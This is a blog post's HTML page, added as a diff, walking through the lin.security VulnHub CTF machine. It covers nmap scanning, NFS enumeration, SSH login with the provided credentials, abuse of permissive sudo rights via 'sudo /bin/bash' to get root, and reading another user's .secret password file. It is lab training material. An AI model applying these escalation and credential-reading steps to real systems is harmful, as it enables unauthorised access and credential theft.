@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="DescriptionHere at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabi">
+<meta name="keywords" content="vulnhub,ctf,walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lin Security Walkthrough">
+<meta property="og:url" content="https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/index.html">
+<meta property="og:site_name" content="InfoSec Adventures">
+<meta property="og:description" content="DescriptionHere at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabi">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/lin_security_walkthrough.png">
+<meta property="og:updated_time" content="2019-05-01T23:00:51.397Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Lin Security Walkthrough">
+<meta name="twitter:description" content="DescriptionHere at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabi">
+<meta name="twitter:image" content="https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/lin_security_walkthrough.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+
+    <title>Lin Security Walkthrough</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    
+    
+    
+      <link rel="alternate" href="/atom.xml" title="InfoSec Adventures" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/11/16/Blacklight-Walkthrough/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&text=Lin Security Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&title=Lin Security Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lin Security Walkthrough&body=Check out this article: https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&title=Lin Security Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.3.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.4.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Lin Security Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">InfoSec Adventures</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-15T20:48:14.000Z" itemprop="datePublished">2018.11.15.</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Walkthroughs/">CTF Walkthroughs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/vulnhub/">vulnhub</a>, <a class="tag-link" href="/tags/walkthrough/">walkthrough</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script>
+
+<p><img src="lin_security_walkthrough.png" alt></p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Here at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabilities that allow a user to escalate to root on the box. This has been designed to help understand how certain built-in applications and services if misconfigured, may be abused by an attacker.</p>
+<p>We have configured the box to simulate real-world vulnerabilities (albeit on a single host) which will help you to perfect your local privilege escalation skills, techniques and toolsets. There are a number challenges which range from fairly easy to intermediate level and we’re excited to see the methods you use to solve them!</p>
+<p>The image is just under 1.7 GB and can be downloaded using the link above. On opening the OVA file a VM named lin.security will be imported and configured with a NAT adapter, but this can be changed to bridged via the the preferences of your preferred virtualisation platform.</p>
+<p>To get started you can log onto the host with the credentials: bob/secret</p>
+<h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The nmap port scan resulted in the following output:</p>
+<pre><code>root@kali:~# nmap -A -p 1-65535 192.168.43.150
+Nmap scan report for linsecurity (192.168.43.150)
+Host is up (0.00020s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)
+|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)
+|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  3           2049/udp  nfs
+|   100003  3,4         2049/tcp  nfs
+|   100005  1,2,3      48327/udp  mountd
+|   100005  1,2,3      60531/tcp  mountd
+|   100021  1,3,4      35925/tcp  nlockmgr
+|   100021  1,3,4      55354/udp  nlockmgr
+|   100227  3           2049/tcp  nfs_acl
+|_  100227  3           2049/udp  nfs_acl
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+35925/tcp open  nlockmgr 1-4 (RPC #100021)
+50119/tcp open  mountd   1-3 (RPC #100005)
+52467/tcp open  mountd   1-3 (RPC #100005)
+60531/tcp open  mountd   1-3 (RPC #100005)
+MAC Address: 08:00:27:A3:D2:FD (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.20 ms linsecurity (192.168.43.150)
+</code></pre><p>It looks like, there’s a shared network filesystem…</p>
+<pre><code>root@kali:~# showmount -e 192.168.43.150
+Export list for 192.168.43.150:
+/home/peter *
+</code></pre><p>As you can see, peter’s home folder was shared, but after mounting, I couldn’t find anything interesting. The creator of the machine provided a username and a password to log in. So, let’s use it!</p>
+<pre><code>root@kali:~# ssh bob@192.168.43.150
+bob@192.168.43.150&apos;s password:
+
+Welcome to lin.security | [https://in.security](https://in.security) | version 1.0
+
+bob@linsecurity:~$
+</code></pre><div class="addthis_tipjar_inline"></div>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>As for enumeration, I checked bob’s privileges:</p>
+<pre><code>bob@linsecurity:~$ sudo -l
+[sudo] password for bob:
+Matching Defaults entries for bob on linsecurity:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bob may run the following commands on linsecurity:
+    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp,
+        /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl,
+        /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp
+</code></pre><h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>We have the ability run a bunch of things as root, without actually knowing the root password. Probably the most convenient solution is to run the bash program as root.</p>
+<pre><code>bob@linsecurity:~$ sudo /bin/bash
+root@linsecurity:~# whoami
+root
+</code></pre><p>At this point the challenge was over, but I checked out susan’s home directory and found a .secret file.</p>
+<pre><code>root@linsecurity:/home/susan# ls -la
+total 32
+drwxr-xr-x 4 susan susan 4096 Aug  6 21:38 .
+drwxr-xr-x 5 root  root  4096 Jul  9 19:58 ..
+-rw-r--r-- 1 susan susan  220 Jul  9 19:58 .bash_logout
+-rw-r--r-- 1 susan susan 3771 Jul  9 19:58 .bashrc
+drwx------ 2 susan susan 4096 Aug  6 21:38 .cache
+drwx------ 3 susan susan 4096 Aug  6 21:38 .gnupg
+-rw-r--r-- 1 susan susan  807 Jul  9 19:58 .profile
+-rw-r--r-- 1 susan susan   20 Jul  9 19:57 .secret
+root@linsecurity:/home/susan# cat .secret
+MySuperS3cretValue!
+</code></pre><p>It turned out, it was her SSH password…</p>
+<h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedbacks and donations are always welcome!</p>
+<p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Port scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root-access"><span class="toc-number">1.3.</span> <span class="toc-text">Getting root access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.4.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&text=Lin Security Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&title=Lin Security Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lin Security Walkthrough&body=Check out this article: https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2018/11/15/Lin-Security-Walkthrough/&title=Lin Security Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <!--<a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>-->
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kristof Toth
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131012780-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'infosecadventures';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
